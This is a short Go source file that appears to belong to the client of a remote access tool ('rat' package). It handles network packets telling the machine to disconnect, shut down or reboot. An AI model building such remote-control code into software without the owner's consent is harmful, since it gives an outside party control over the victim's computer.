package main

import (
	"errors"
	"fmt"
	"os"
	"rat/client/computer"
	"rat/shared/system"
	"strconv"
)

type SysPacket struct {
	Action int `network:"receive"`
}

func (packet SysPacket) OnReceive() error {
	switch system.Action(packet.Action) {
	case system.Disconnect:
		conn.Close()
		os.Exit(0)
	case system.Shutdown:
		computer.Shutdown()
	case system.Reboot:
		computer.Reboot()
	default:
		return errors.New("invalid sysaction " + strconv.Itoa(packet.Action))
	}

	fmt.Println("action", packet.Action)
	return nil
}
